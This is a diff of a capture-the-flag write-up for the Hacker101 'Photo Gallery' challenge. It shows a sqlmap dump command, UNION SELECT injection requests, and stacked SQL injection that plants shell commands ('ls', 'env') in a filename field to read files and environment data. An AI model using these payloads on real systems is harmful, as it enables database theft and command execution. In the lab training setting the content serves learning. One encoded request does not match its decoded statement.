@@ -2,7 +2,7 @@
 title: Hacker101 CTF Photo Gallery writeup
 description: A write up for the Photo Gallery [moderae] challenge
 published: true
-datePublished: 1609676432536
+datePublished: 1609676431536
 author: lwlx
 authorTwitter: "0x0000005"
 authorPhoto: /profile.jpg
@@ -104,7 +104,7 @@ The state uf the union? are they hinting on using UNION statements in the query?
 _The UNION operator is used to combine the result-set of two or more SELECT statements._
 That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:
 
-http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'
+`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`
 
 but what do we look for? Lets get another hint.
 
@@ -163,7 +163,7 @@ This can take quite a while.. for me it crashed after 40 minutes, so i gave it a
 sqlmap -u "http://35.190.155.168/c947e97f6e/fetch?id=3" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename
 ```
 
-This means that swlmap will start with the filename of id=3 which is exactly what we want right now.
+This means that sqlmap will start with the filename of id=3 which is exactly what we want right now.
 
 ![starts to query filename of id 3](/hackerone/photo-gallery-hash.png "query on the filename of id 3")
 So lets have a look at our results:
@@ -187,13 +187,32 @@ Table: photos
 > `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`
 
 decrypted: `\*||+ls+-a+tmp.txt`
+another file! nice lets try and get that with a UNION STATEMENT request like so:
 
-so we try this request:
-`GET /ad3e8c7df9/fetch?id=3\*||+ls+-a+tmp.txt`
+`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`
+hmm no luck it seems... let's do it another way.
 
-`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`
+From our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.
 
-`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'temp.txt'-- HTTP/1.1`
+We want to run following statements via the vulnerable param:
+
+#### ls in the /files directory and store data in bigWin.txt
+
+`update photos set filename='* || ls ./files >bigWin.txt ' where id=3; commit;`
+
+`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`
+
+#### store all env data in bigWin.txt (because so often flags are here)
+
+`update photos set filename='* || env >bigWin.txt' where id=3; commit;`
+
+`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`
+
+after you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!
+
+`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`
+
+Tadaa!! we got it all.
 
 ```bash
 "^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$"
